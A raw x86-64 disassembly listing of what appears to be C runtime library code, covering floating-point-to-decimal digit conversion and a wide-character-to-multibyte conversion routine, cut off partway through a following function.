  408c36:	83 bc 24 30 01 00 00 	cmpl   $0x2,0x130(%rsp)
  408c3d:	02 
  408c3e:	0f 8f 8b 07 00 00    	jg     0x4093cf
  408c44:	8b 8c 24 9c 00 00 00 	mov    0x9c(%rsp),%ecx
  408c4b:	89 8c 24 88 00 00 00 	mov    %ecx,0x88(%rsp)
  408c52:	c7 84 24 ac 00 00 00 	movl   $0x1,0xac(%rsp)
  408c59:	01 00 00 00 
  408c5d:	4c 89 fe             	mov    %r15,%rsi
  408c60:	8b bc 24 88 00 00 00 	mov    0x88(%rsp),%edi
  408c67:	eb 22                	jmp    0x408c8b
  408c69:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  408c70:	4c 89 f1             	mov    %r14,%rcx
  408c73:	45 31 c0             	xor    %r8d,%r8d
  408c76:	ba 0a 00 00 00       	mov    $0xa,%edx
  408c7b:	e8 10 12 00 00       	call   0x409e90
  408c80:	83 84 24 ac 00 00 00 	addl   $0x1,0xac(%rsp)
  408c87:	01 
  408c88:	49 89 c6             	mov    %rax,%r14
  408c8b:	48 89 ea             	mov    %rbp,%rdx
  408c8e:	4c 89 f1             	mov    %r14,%rcx
  408c91:	e8 1a 0d 00 00       	call   0x4099b0
  408c96:	44 8d 60 30          	lea    0x30(%rax),%r12d
  408c9a:	44 88 26             	mov    %r12b,(%rsi)
  408c9d:	48 83 c6 01          	add    $0x1,%rsi
  408ca1:	3b bc 24 ac 00 00 00 	cmp    0xac(%rsp),%edi
  408ca8:	7f c6                	jg     0x408c70
  408caa:	31 ff                	xor    %edi,%edi
  408cac:	8b 54 24 6c          	mov    0x6c(%rsp),%edx
  408cb0:	85 d2                	test   %edx,%edx
  408cb2:	0f 84 73 03 00 00    	je     0x40902b
  408cb8:	83 7c 24 6c 02       	cmpl   $0x2,0x6c(%rsp)
  408cbd:	0f 84 98 03 00 00    	je     0x40905b
  408cc3:	41 83 7e 14 01       	cmpl   $0x1,0x14(%r14)
  408cc8:	0f 8e d6 05 00 00    	jle    0x4092a4
  408cce:	0f b6 56 ff          	movzbl -0x1(%rsi),%edx
  408cd2:	eb 07                	jmp    0x408cdb
  408cd4:	0f b6 50 ff          	movzbl -0x1(%rax),%edx
  408cd8:	48 89 c6             	mov    %rax,%rsi
  408cdb:	80 fa 39             	cmp    $0x39,%dl
  408cde:	48 8d 46 ff          	lea    -0x1(%rsi),%rax
  408ce2:	0f 85 24 05 00 00    	jne    0x40920c
  408ce8:	4c 39 f8             	cmp    %r15,%rax
  408ceb:	75 e7                	jne    0x408cd4
  408ced:	44 8b 64 24 68       	mov    0x68(%rsp),%r12d
  408cf2:	41 c6 07 31          	movb   $0x31,(%r15)
  408cf6:	41 bd 20 00 00 00    	mov    $0x20,%r13d
  408cfc:	41 83 c4 02          	add    $0x2,%r12d
  408d00:	e9 16 f9 ff ff       	jmp    0x40861b
  408d05:	4c 89 5c 24 28       	mov    %r11,0x28(%rsp)
  408d0a:	c7 84 24 ac 00 00 00 	movl   $0x1,0xac(%rsp)
  408d11:	01 00 00 00 
  408d15:	49 8d 77 01          	lea    0x1(%r15),%rsi
  408d19:	f2 0f 10 44 24 28    	movsd  0x28(%rsp),%xmm0
  408d1f:	66 0f 28 c8          	movapd %xmm0,%xmm1
  408d23:	f2 0f 5e ca          	divsd  %xmm2,%xmm1
  408d27:	f2 0f 2c c1          	cvttsd2si %xmm1,%eax
  408d2b:	f2 0f 2a c8          	cvtsi2sd %eax,%xmm1
  408d2f:	8d 50 30             	lea    0x30(%rax),%edx
  408d32:	41 88 17             	mov    %dl,(%r15)
  408d35:	f2 0f 59 ca          	mulsd  %xmm2,%xmm1
  408d39:	f2 0f 5c c1          	subsd  %xmm1,%xmm0
  408d3d:	66 0f 2e c6          	ucomisd %xmm6,%xmm0
  408d41:	0f 8b 08 06 00 00    	jnp    0x40934f
  408d47:	8b 94 24 ac 00 00 00 	mov    0xac(%rsp),%edx
  408d4e:	39 94 24 88 00 00 00 	cmp    %edx,0x88(%rsp)
  408d55:	0f 84 e7 00 00 00    	je     0x408e42
  408d5b:	f2 0f 10 1d 1d 4d 15 	movsd  0x154d1d(%rip),%xmm3        # 0x55da80
  408d62:	00 
  408d63:	8b 8c 24 88 00 00 00 	mov    0x88(%rsp),%ecx
  408d6a:	66 0f 28 e6          	movapd %xmm6,%xmm4
  408d6e:	eb 0f                	jmp    0x408d7f
  408d70:	8b 94 24 ac 00 00 00 	mov    0xac(%rsp),%edx
  408d77:	39 d1                	cmp    %edx,%ecx
  408d79:	0f 84 c3 00 00 00    	je     0x408e42
  408d7f:	66 0f 28 c8          	movapd %xmm0,%xmm1
  408d83:	83 c2 01             	add    $0x1,%edx
  408d86:	89 94 24 ac 00 00 00 	mov    %edx,0xac(%rsp)
  408d8d:	f2 0f 59 cb          	mulsd  %xmm3,%xmm1
  408d91:	66 0f 28 c1          	movapd %xmm1,%xmm0
  408d95:	f2 0f 5e c2          	divsd  %xmm2,%xmm0
  408d99:	f2 0f 2c c0          	cvttsd2si %xmm0,%eax
  408d9d:	f2 0f 2a c0          	cvtsi2sd %eax,%xmm0
  408da1:	8d 50 30             	lea    0x30(%rax),%edx
  408da4:	88 16                	mov    %dl,(%rsi)
  408da6:	48 83 c6 01          	add    $0x1,%rsi
  408daa:	f2 0f 59 c2          	mulsd  %xmm2,%xmm0
  408dae:	f2 0f 5c c8          	subsd  %xmm0,%xmm1
  408db2:	66 0f 2e ce          	ucomisd %xmm6,%xmm1
  408db6:	66 0f 28 c1          	movapd %xmm1,%xmm0
  408dba:	7a b4                	jp     0x408d70
  408dbc:	66 0f 2e cc          	ucomisd %xmm4,%xmm1
  408dc0:	75 ae                	jne    0x408d70
  408dc2:	44 8b 64 24 68       	mov    0x68(%rsp),%r12d
  408dc7:	41 83 c4 01          	add    $0x1,%r12d
  408dcb:	45 31 ed             	xor    %r13d,%r13d
  408dce:	e9 cf f0 ff ff       	jmp    0x407ea2
  408dd3:	83 7c 24 60 01       	cmpl   $0x1,0x60(%rsp)
  408dd8:	0f 85 e3 f9 ff ff    	jne    0x4087c1
  408dde:	8b 47 04             	mov    0x4(%rdi),%eax
  408de1:	83 c0 01             	add    $0x1,%eax
  408de4:	41 39 c4             	cmp    %eax,%r12d
  408de7:	0f 8e d4 f9 ff ff    	jle    0x4087c1
  408ded:	83 84 24 80 00 00 00 	addl   $0x1,0x80(%rsp)
  408df4:	01 
  408df5:	83 44 24 70 01       	addl   $0x1,0x70(%rsp)
  408dfa:	c7 84 24 8c 00 00 00 	movl   $0x1,0x8c(%rsp)
  408e01:	01 00 00 00 
  408e05:	e9 b7 f9 ff ff       	jmp    0x4087c1
  408e0a:	83 bc 24 88 00 00 00 	cmpl   $0xe,0x88(%rsp)
  408e11:	0e 
  408e12:	c7 84 24 ac 00 00 00 	movl   $0x1,0xac(%rsp)
  408e19:	01 00 00 00 
  408e1d:	b9 01 00 00 00       	mov    $0x1,%ecx
  408e22:	0f 96 c2             	setbe  %dl
  408e25:	21 c2                	and    %eax,%edx
  408e27:	e9 06 f4 ff ff       	jmp    0x408232
  408e2c:	41 bf 01 00 00 00    	mov    $0x1,%r15d
  408e32:	c7 84 24 38 01 00 00 	movl   $0x1,0x138(%rsp)
  408e39:	01 00 00 00 
  408e3d:	e9 76 fd ff ff       	jmp    0x408bb8
  408e42:	44 8b 54 24 6c       	mov    0x6c(%rsp),%r10d
  408e47:	45 85 d2             	test   %r10d,%r10d
  408e4a:	0f 84 e9 02 00 00    	je     0x409139
  408e50:	83 7c 24 6c 01       	cmpl   $0x1,0x6c(%rsp)
  408e55:	0f 84 3b 04 00 00    	je     0x409296
  408e5b:	44 8b 64 24 68       	mov    0x68(%rsp),%r12d
  408e60:	41 83 c4 01          	add    $0x1,%r12d
  408e64:	e9 c5 f5 ff ff       	jmp    0x40842e
  408e69:	41 bc 02 00 00 00    	mov    $0x2,%r12d
  408e6f:	31 ed                	xor    %ebp,%ebp
  408e71:	48 c7 44 24 78 00 00 	movq   $0x0,0x78(%rsp)
  408e78:	00 00 
  408e7a:	e9 8c f7 ff ff       	jmp    0x40860b
  408e7f:	4c 89 54 24 28       	mov    %r10,0x28(%rsp)
  408e84:	8d 48 ff             	lea    -0x1(%rax),%ecx
  408e87:	48 8d 15 72 4c 15 00 	lea    0x154c72(%rip),%rdx        # 0x55db00
  408e8e:	f2 0f 10 5c 24 28    	movsd  0x28(%rsp),%xmm3
  408e94:	4c 89 5c 24 28       	mov    %r11,0x28(%rsp)
  408e99:	48 63 c9             	movslq %ecx,%rcx
  408e9c:	c7 84 24 ac 00 00 00 	movl   $0x1,0xac(%rsp)
  408ea3:	01 00 00 00 
  408ea7:	4c 89 fe             	mov    %r15,%rsi
  408eaa:	f2 0f 59 1c ca       	mulsd  (%rdx,%rcx,8),%xmm3
  408eaf:	f2 0f 10 44 24 28    	movsd  0x28(%rsp),%xmm0
  408eb5:	f2 0f 10 15 c3 4b 15 	movsd  0x154bc3(%rip),%xmm2        # 0x55da80
  408ebc:	00 
  408ebd:	eb 13                	jmp    0x408ed2
  408ebf:	90                   	nop
  408ec0:	f2 0f 59 c2          	mulsd  %xmm2,%xmm0
  408ec4:	83 c1 01             	add    $0x1,%ecx
  408ec7:	89 8c 24 ac 00 00 00 	mov    %ecx,0xac(%rsp)
  408ece:	66 0f 28 c8          	movapd %xmm0,%xmm1
  408ed2:	f2 0f 2c d1          	cvttsd2si %xmm1,%edx
  408ed6:	85 d2                	test   %edx,%edx
  408ed8:	74 0c                	je     0x408ee6
  408eda:	f2 0f 2a c2          	cvtsi2sd %edx,%xmm0
  408ede:	f2 0f 5c c8          	subsd  %xmm0,%xmm1
  408ee2:	66 0f 28 c1          	movapd %xmm1,%xmm0
  408ee6:	83 c2 30             	add    $0x30,%edx
  408ee9:	88 16                	mov    %dl,(%rsi)
  408eeb:	8b 8c 24 ac 00 00 00 	mov    0xac(%rsp),%ecx
  408ef2:	48 83 c6 01          	add    $0x1,%rsi
  408ef6:	39 c1                	cmp    %eax,%ecx
  408ef8:	75 c6                	jne    0x408ec0
  408efa:	f2 0f 10 0d ae 4b 15 	movsd  0x154bae(%rip),%xmm1        # 0x55dab0
  408f01:	00 
  408f02:	66 0f 28 d3          	movapd %xmm3,%xmm2
  408f06:	f2 0f 58 d1          	addsd  %xmm1,%xmm2
  408f0a:	66 0f 2e c2          	ucomisd %xmm2,%xmm0
  408f0e:	0f 87 63 ef ff ff    	ja     0x407e77
  408f14:	f2 0f 5c cb          	subsd  %xmm3,%xmm1
  408f18:	66 0f 2e c8          	ucomisd %xmm0,%xmm1
  408f1c:	0f 86 58 f6 ff ff    	jbe    0x40857a
  408f22:	66 0f 2e c6          	ucomisd %xmm6,%xmm0
  408f26:	0f 8a 34 02 00 00    	jp     0x409160
  408f2c:	0f 85 2e 02 00 00    	jne    0x409160
  408f32:	45 31 ed             	xor    %r13d,%r13d
  408f35:	eb 10                	jmp    0x408f47
  408f37:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  408f3e:	00 00 
  408f40:	0f b6 50 ff          	movzbl -0x1(%rax),%edx
  408f44:	48 89 c6             	mov    %rax,%rsi
  408f47:	80 fa 30             	cmp    $0x30,%dl
  408f4a:	48 8d 46 ff          	lea    -0x1(%rsi),%rax
  408f4e:	74 f0                	je     0x408f40
  408f50:	45 8d 61 01          	lea    0x1(%r9),%r12d
  408f54:	e9 49 ef ff ff       	jmp    0x407ea2
  408f59:	8b 4c 24 6c          	mov    0x6c(%rsp),%ecx
  408f5d:	49 89 d9             	mov    %rbx,%r9
  408f60:	89 e8                	mov    %ebp,%eax
  408f62:	45 89 f8             	mov    %r15d,%r8d
  408f65:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
  408f6a:	4c 8b 7c 24 70       	mov    0x70(%rsp),%r15
  408f6f:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
  408f76:	00 
  408f77:	85 c9                	test   %ecx,%ecx
  408f79:	0f 84 b1 02 00 00    	je     0x409230
  408f7f:	41 83 7e 14 01       	cmpl   $0x1,0x14(%r14)
  408f84:	0f 8e 9b 02 00 00    	jle    0x409225
  408f8a:	83 7c 24 6c 02       	cmpl   $0x2,0x6c(%rsp)
  408f8f:	0f 84 f6 02 00 00    	je     0x40928b
  408f95:	4d 89 cd             	mov    %r9,%r13
  408f98:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
  408f9d:	eb 47                	jmp    0x408fe6
  408f9f:	90                   	nop
  408fa0:	44 88 26             	mov    %r12b,(%rsi)
  408fa3:	45 31 c0             	xor    %r8d,%r8d
  408fa6:	4c 89 e9             	mov    %r13,%rcx
  408fa9:	ba 0a 00 00 00       	mov    $0xa,%edx
  408fae:	48 83 c6 01          	add    $0x1,%rsi
  408fb2:	e8 d9 0e 00 00       	call   0x409e90
  408fb7:	4c 39 ef             	cmp    %r13,%rdi
  408fba:	4c 89 f1             	mov    %r14,%rcx
  408fbd:	ba 0a 00 00 00       	mov    $0xa,%edx
  408fc2:	48 0f 44 f8          	cmove  %rax,%rdi
  408fc6:	45 31 c0             	xor    %r8d,%r8d
  408fc9:	48 89 c3             	mov    %rax,%rbx
  408fcc:	e8 bf 0e 00 00       	call   0x409e90
  408fd1:	48 89 ea             	mov    %rbp,%rdx
  408fd4:	48 89 c1             	mov    %rax,%rcx
  408fd7:	49 89 c6             	mov    %rax,%r14
  408fda:	e8 d1 09 00 00       	call   0x4099b0
  408fdf:	44 8d 60 30          	lea    0x30(%rax),%r12d
  408fe3:	49 89 dd             	mov    %rbx,%r13
  408fe6:	4c 89 ea             	mov    %r13,%rdx
  408fe9:	48 89 e9             	mov    %rbp,%rcx
  408fec:	e8 df 12 00 00       	call   0x40a2d0
  408ff1:	85 c0                	test   %eax,%eax
  408ff3:	7f ab                	jg     0x408fa0
  408ff5:	41 83 fc 39          	cmp    $0x39,%r12d
  408ff9:	4d 89 e9             	mov    %r13,%r9
  408ffc:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
  409001:	0f 84 b9 02 00 00    	je     0x4092c0
  409007:	41 83 c4 01          	add    $0x1,%r12d
  40900b:	41 bd 20 00 00 00    	mov    $0x20,%r13d
  409011:	44 88 26             	mov    %r12b,(%rsi)
  409014:	44 8b 64 24 68       	mov    0x68(%rsp),%r12d
  409019:	48 83 c6 01          	add    $0x1,%rsi
  40901d:	4c 89 4c 24 78       	mov    %r9,0x78(%rsp)
  409022:	41 83 c4 01          	add    $0x1,%r12d
  409026:	e9 f0 f5 ff ff       	jmp    0x40861b
  40902b:	4c 89 f1             	mov    %r14,%rcx
  40902e:	ba 01 00 00 00       	mov    $0x1,%edx
  409033:	e8 98 11 00 00       	call   0x40a1d0
  409038:	48 89 ea             	mov    %rbp,%rdx
  40903b:	48 89 c1             	mov    %rax,%rcx
  40903e:	49 89 c6             	mov    %rax,%r14
  409041:	e8 8a 12 00 00       	call   0x40a2d0
  409046:	83 f8 00             	cmp    $0x0,%eax
  409049:	0f 8f 7f fc ff ff    	jg     0x408cce
  40904f:	75 0a                	jne    0x40905b
  409051:	41 80 e4 01          	and    $0x1,%r12b
  409055:	0f 85 73 fc ff ff    	jne    0x408cce
  40905b:	41 83 7e 14 01       	cmpl   $0x1,0x14(%r14)
  409060:	0f 8e 56 03 00 00    	jle    0x4093bc
  409066:	41 bd 10 00 00 00    	mov    $0x10,%r13d
  40906c:	eb 05                	jmp    0x409073
  40906e:	66 90                	xchg   %ax,%ax
  409070:	48 89 c6             	mov    %rax,%rsi
  409073:	80 7e ff 30          	cmpb   $0x30,-0x1(%rsi)
  409077:	48 8d 46 ff          	lea    -0x1(%rsi),%rax
  40907b:	74 f3                	je     0x409070
  40907d:	44 8b 64 24 68       	mov    0x68(%rsp),%r12d
  409082:	41 83 c4 01          	add    $0x1,%r12d
  409086:	e9 90 f5 ff ff       	jmp    0x40861b
  40908b:	8b b4 24 80 00 00 00 	mov    0x80(%rsp),%esi
  409092:	c7 84 24 ac 00 00 00 	movl   $0x0,0xac(%rsp)
  409099:	00 00 00 00 
  40909d:	31 c0                	xor    %eax,%eax
  40909f:	2b b4 24 88 00 00 00 	sub    0x88(%rsp),%esi
  4090a6:	e9 30 f6 ff ff       	jmp    0x4086db
  4090ab:	41 8b 49 08          	mov    0x8(%r9),%ecx
  4090af:	e8 9c 0c 00 00       	call   0x409d50
  4090b4:	48 8b 54 24 78       	mov    0x78(%rsp),%rdx
  4090b9:	48 8d 48 10          	lea    0x10(%rax),%rcx
  4090bd:	48 89 c6             	mov    %rax,%rsi
  4090c0:	48 63 42 14          	movslq 0x14(%rdx),%rax
  4090c4:	48 83 c2 10          	add    $0x10,%rdx
  4090c8:	4c 8d 04 85 08 00 00 	lea    0x8(,%rax,4),%r8
  4090cf:	00 
  4090d0:	e8 f3 17 00 00       	call   0x40a8c8
  4090d5:	ba 01 00 00 00       	mov    $0x1,%edx
  4090da:	48 89 f1             	mov    %rsi,%rcx
  4090dd:	e8 ee 10 00 00       	call   0x40a1d0
  4090e2:	49 89 c1             	mov    %rax,%r9
  4090e5:	e9 93 f8 ff ff       	jmp    0x40897d
  4090ea:	83 7c 24 6c 02       	cmpl   $0x2,0x6c(%rsp)
  4090ef:	0f 84 0f f9 ff ff    	je     0x408a04
  4090f5:	41 83 fc 39          	cmp    $0x39,%r12d
  4090f9:	49 89 d9             	mov    %rbx,%r9
  4090fc:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
  409101:	4c 8b 7c 24 70       	mov    0x70(%rsp),%r15
  409106:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
  40910d:	00 
  40910e:	0f 84 ac 01 00 00    	je     0x4092c0
  409114:	45 8d 6c 24 01       	lea    0x1(%r12),%r13d
  409119:	44 8b 64 24 68       	mov    0x68(%rsp),%r12d
  40911e:	4c 89 4c 24 78       	mov    %r9,0x78(%rsp)
  409123:	44 88 2e             	mov    %r13b,(%rsi)
  409126:	48 83 c6 01          	add    $0x1,%rsi
  40912a:	41 bd 20 00 00 00    	mov    $0x20,%r13d
  409130:	41 83 c4 01          	add    $0x1,%r12d
  409134:	e9 e2 f4 ff ff       	jmp    0x40861b
  409139:	f2 0f 58 c0          	addsd  %xmm0,%xmm0
  40913d:	66 0f 2e c2          	ucomisd %xmm2,%xmm0
  409141:	0f 87 4f 01 00 00    	ja     0x409296
  409147:	66 0f 2e d0          	ucomisd %xmm0,%xmm2
  40914b:	0f b6 56 ff          	movzbl -0x1(%rsi),%edx
  40914f:	44 8b 4c 24 68       	mov    0x68(%rsp),%r9d
  409154:	7a 0a                	jp     0x409160
  409156:	75 08                	jne    0x409160
  409158:	a8 01                	test   $0x1,%al
  40915a:	0f 85 17 ed ff ff    	jne    0x407e77
  409160:	41 bd 10 00 00 00    	mov    $0x10,%r13d
  409166:	e9 dc fd ff ff       	jmp    0x408f47
  40916b:	49 89 d9             	mov    %rbx,%r9
  40916e:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
  409173:	4c 8b 7c 24 70       	mov    0x70(%rsp),%r15
  409178:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
  40917f:	00 
  409180:	4c 89 4c 24 78       	mov    %r9,0x78(%rsp)
  409185:	e9 22 fb ff ff       	jmp    0x408cac
  40918a:	44 8b 94 24 88 00 00 	mov    0x88(%rsp),%r10d
  409191:	00 
  409192:	45 85 d2             	test   %r10d,%r10d
  409195:	0f 84 75 f3 ff ff    	je     0x408510
  40919b:	44 8b 8c 24 9c 00 00 	mov    0x9c(%rsp),%r9d
  4091a2:	00 
  4091a3:	45 85 c9             	test   %r9d,%r9d
  4091a6:	0f 8e ce f3 ff ff    	jle    0x40857a
  4091ac:	f2 0f 10 0d cc 48 15 	movsd  0x1548cc(%rip),%xmm1        # 0x55da80
  4091b3:	00 
  4091b4:	41 b9 ff ff ff ff    	mov    $0xffffffff,%r9d
  4091ba:	f2 0f 59 cc          	mulsd  %xmm4,%xmm1
  4091be:	66 0f 28 c1          	movapd %xmm1,%xmm0
  4091c2:	f2 0f 11 4c 24 28    	movsd  %xmm1,0x28(%rsp)
  4091c8:	4c 8b 5c 24 28       	mov    0x28(%rsp),%r11
  4091cd:	f2 0f 59 05 b3 48 15 	mulsd  0x1548b3(%rip),%xmm0        # 0x55da88
  4091d4:	00 
  4091d5:	f2 0f 58 05 b3 48 15 	addsd  0x1548b3(%rip),%xmm0        # 0x55da90
  4091dc:	00 
  4091dd:	f2 0f 11 44 24 28    	movsd  %xmm0,0x28(%rsp)
  4091e3:	4c 8b 54 24 28       	mov    0x28(%rsp),%r10
  4091e8:	4c 89 d0             	mov    %r10,%rax
  4091eb:	41 83 e2 ff          	and    $0xffffffff,%r10d
  4091ef:	48 c1 e8 20          	shr    $0x20,%rax
  4091f3:	8d 80 00 00 c0 fc    	lea    -0x3400000(%rax),%eax
  4091f9:	48 c1 e0 20          	shl    $0x20,%rax
  4091fd:	49 09 c2             	or     %rax,%r10
  409200:	8b 84 24 9c 00 00 00 	mov    0x9c(%rsp),%eax
  409207:	e9 1d f1 ff ff       	jmp    0x408329
  40920c:	44 8b 64 24 68       	mov    0x68(%rsp),%r12d
  409211:	83 c2 01             	add    $0x1,%edx
  409214:	41 bd 20 00 00 00    	mov    $0x20,%r13d
  40921a:	88 10                	mov    %dl,(%rax)
  40921c:	41 83 c4 01          	add    $0x1,%r12d
  409220:	e9 f6 f3 ff ff       	jmp    0x40861b
  409225:	41 83 7e 18 00       	cmpl   $0x0,0x18(%r14)
  40922a:	0f 85 5a fd ff ff    	jne    0x408f8a
  409230:	85 c0                	test   %eax,%eax
  409232:	0f 8e 9e 00 00 00    	jle    0x4092d6
  409238:	4c 89 f1             	mov    %r14,%rcx
  40923b:	ba 01 00 00 00       	mov    $0x1,%edx
  409240:	44 89 44 24 30       	mov    %r8d,0x30(%rsp)
  409245:	4c 89 4c 24 38       	mov    %r9,0x38(%rsp)
  40924a:	e8 81 0f 00 00       	call   0x40a1d0
  40924f:	48 89 ea             	mov    %rbp,%rdx
  409252:	48 89 c1             	mov    %rax,%rcx
  409255:	49 89 c6             	mov    %rax,%r14
  409258:	e8 73 10 00 00       	call   0x40a2d0
  40925d:	83 f8 00             	cmp    $0x0,%eax
  409260:	44 8b 44 24 30       	mov    0x30(%rsp),%r8d
  409265:	4c 8b 4c 24 38       	mov    0x38(%rsp),%r9
  40926a:	0f 8e fd 00 00 00    	jle    0x40936d
  409270:	41 83 fc 39          	cmp    $0x39,%r12d
  409274:	74 4a                	je     0x4092c0
  409276:	45 8d 60 31          	lea    0x31(%r8),%r12d
  40927a:	41 bd 20 00 00 00    	mov    $0x20,%r13d
  409280:	41 83 7e 14 01       	cmpl   $0x1,0x14(%r14)
  409285:	0f 8e cf 00 00 00    	jle    0x40935a
  40928b:	41 bd 10 00 00 00    	mov    $0x10,%r13d
  409291:	e9 7b fd ff ff       	jmp    0x409011
  409296:	0f b6 56 ff          	movzbl -0x1(%rsi),%edx
  40929a:	44 8b 4c 24 68       	mov    0x68(%rsp),%r9d
  40929f:	e9 d3 eb ff ff       	jmp    0x407e77
  4092a4:	41 8b 46 18          	mov    0x18(%r14),%eax
  4092a8:	85 c0                	test   %eax,%eax
  4092aa:	0f 85 1e fa ff ff    	jne    0x408cce
  4092b0:	45 31 ed             	xor    %r13d,%r13d
  4092b3:	e9 bb fd ff ff       	jmp    0x409073
  4092b8:	83 c2 01             	add    $0x1,%edx
  4092bb:	e9 d6 eb ff ff       	jmp    0x407e96
  4092c0:	c6 06 39             	movb   $0x39,(%rsi)
  4092c3:	4c 89 4c 24 78       	mov    %r9,0x78(%rsp)
  4092c8:	48 83 c6 01          	add    $0x1,%rsi
  4092cc:	ba 39 00 00 00       	mov    $0x39,%edx
  4092d1:	e9 05 fa ff ff       	jmp    0x408cdb
  4092d6:	45 31 ed             	xor    %r13d,%r13d
  4092d9:	eb a5                	jmp    0x409280
  4092db:	41 83 fc 39          	cmp    $0x39,%r12d
  4092df:	49 89 d9             	mov    %rbx,%r9
  4092e2:	45 89 f8             	mov    %r15d,%r8d
  4092e5:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
  4092ea:	4c 8b 7c 24 70       	mov    0x70(%rsp),%r15
  4092ef:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
  4092f6:	00 
  4092f7:	74 c7                	je     0x4092c0
  4092f9:	45 85 ed             	test   %r13d,%r13d
  4092fc:	0f 8e 95 00 00 00    	jle    0x409397
  409302:	45 8d 60 31          	lea    0x31(%r8),%r12d
  409306:	41 bd 20 00 00 00    	mov    $0x20,%r13d
  40930c:	e9 00 fd ff ff       	jmp    0x409011
  409311:	48 8b 4c 24 78       	mov    0x78(%rsp),%rcx
  409316:	45 31 c0             	xor    %r8d,%r8d
  409319:	ba 0a 00 00 00       	mov    $0xa,%edx
  40931e:	e8 6d 0b 00 00       	call   0x409e90
  409323:	83 bc 24 9c 00 00 00 	cmpl   $0x0,0x9c(%rsp)
  40932a:	00 
  40932b:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
  409330:	7f 0a                	jg     0x40933c
  409332:	83 bc 24 30 01 00 00 	cmpl   $0x2,0x130(%rsp)
  409339:	02 
  40933a:	7f 48                	jg     0x409384
  40933c:	8b 94 24 9c 00 00 00 	mov    0x9c(%rsp),%edx
  409343:	89 94 24 88 00 00 00 	mov    %edx,0x88(%rsp)
  40934a:	e9 02 f6 ff ff       	jmp    0x408951
  40934f:	0f 85 f2 f9 ff ff    	jne    0x408d47
  409355:	e9 68 fa ff ff       	jmp    0x408dc2
  40935a:	41 83 7e 18 00       	cmpl   $0x0,0x18(%r14)
  40935f:	b8 10 00 00 00       	mov    $0x10,%eax
  409364:	44 0f 45 e8          	cmovne %eax,%r13d
  409368:	e9 a4 fc ff ff       	jmp    0x409011
  40936d:	75 0a                	jne    0x409379
  40936f:	41 f6 c4 01          	test   $0x1,%r12b
  409373:	0f 85 f7 fe ff ff    	jne    0x409270
  409379:	41 bd 20 00 00 00    	mov    $0x20,%r13d
  40937f:	e9 fc fe ff ff       	jmp    0x409280
  409384:	8b 8c 24 9c 00 00 00 	mov    0x9c(%rsp),%ecx
  40938b:	89 8c 24 88 00 00 00 	mov    %ecx,0x88(%rsp)
  409392:	e9 bf f4 ff ff       	jmp    0x408856
  409397:	41 83 7e 14 01       	cmpl   $0x1,0x14(%r14)
  40939c:	41 bd 10 00 00 00    	mov    $0x10,%r13d
  4093a2:	0f 8f 69 fc ff ff    	jg     0x409011
  4093a8:	41 83 7e 18 01       	cmpl   $0x1,0x18(%r14)
  4093ad:	45 19 ed             	sbb    %r13d,%r13d
  4093b0:	41 f7 d5             	not    %r13d
  4093b3:	41 83 e5 10          	and    $0x10,%r13d
  4093b7:	e9 55 fc ff ff       	jmp    0x409011
  4093bc:	45 31 ed             	xor    %r13d,%r13d
  4093bf:	41 83 7e 18 00       	cmpl   $0x0,0x18(%r14)
  4093c4:	0f 85 9c fc ff ff    	jne    0x409066
  4093ca:	e9 a4 fc ff ff       	jmp    0x409073
  4093cf:	8b 84 24 9c 00 00 00 	mov    0x9c(%rsp),%eax
  4093d6:	89 84 24 88 00 00 00 	mov    %eax,0x88(%rsp)
  4093dd:	e9 74 f4 ff ff       	jmp    0x408856
  4093e2:	90                   	nop
  4093e3:	90                   	nop
  4093e4:	90                   	nop
  4093e5:	90                   	nop
  4093e6:	90                   	nop
  4093e7:	90                   	nop
  4093e8:	90                   	nop
  4093e9:	90                   	nop
  4093ea:	90                   	nop
  4093eb:	90                   	nop
  4093ec:	90                   	nop
  4093ed:	90                   	nop
  4093ee:	90                   	nop
  4093ef:	90                   	nop
  4093f0:	48 83 ec 58          	sub    $0x58,%rsp
  4093f4:	45 85 c0             	test   %r8d,%r8d
  4093f7:	44 89 c0             	mov    %r8d,%eax
  4093fa:	66 89 54 24 68       	mov    %dx,0x68(%rsp)
  4093ff:	75 13                	jne    0x409414
  409401:	66 81 fa ff 00       	cmp    $0xff,%dx
  409406:	77 52                	ja     0x40945a
  409408:	88 11                	mov    %dl,(%rcx)
  40940a:	b8 01 00 00 00       	mov    $0x1,%eax
  40940f:	48 83 c4 58          	add    $0x58,%rsp
  409413:	c3                   	ret
  409414:	48 8d 54 24 4c       	lea    0x4c(%rsp),%rdx
  409419:	44 89 4c 24 28       	mov    %r9d,0x28(%rsp)
  40941e:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
  409423:	c7 44 24 4c 00 00 00 	movl   $0x0,0x4c(%rsp)
  40942a:	00 
  40942b:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
  409432:	00 00 
  409434:	41 b9 01 00 00 00    	mov    $0x1,%r9d
  40943a:	48 89 54 24 38       	mov    %rdx,0x38(%rsp)
  40943f:	4c 8d 44 24 68       	lea    0x68(%rsp),%r8
  409444:	31 d2                	xor    %edx,%edx
  409446:	89 c1                	mov    %eax,%ecx
  409448:	ff 15 16 92 15 00    	call   *0x159216(%rip)        # 0x562664
  40944e:	85 c0                	test   %eax,%eax
  409450:	74 08                	je     0x40945a
  409452:	8b 54 24 4c          	mov    0x4c(%rsp),%edx
  409456:	85 d2                	test   %edx,%edx
  409458:	74 b5                	je     0x40940f
  40945a:	e8 61 15 00 00       	call   0x40a9c0
  40945f:	c7 00 2a 00 00 00    	movl   $0x2a,(%rax)
  409465:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  40946a:	48 83 c4 58          	add    $0x58,%rsp
  40946e:	c3                   	ret
  40946f:	90                   	nop
  409470:	57                   	push   %rdi
  409471:	56                   	push   %rsi
  409472:	53                   	push   %rbx
  409473:	48 83 ec 30          	sub    $0x30,%rsp
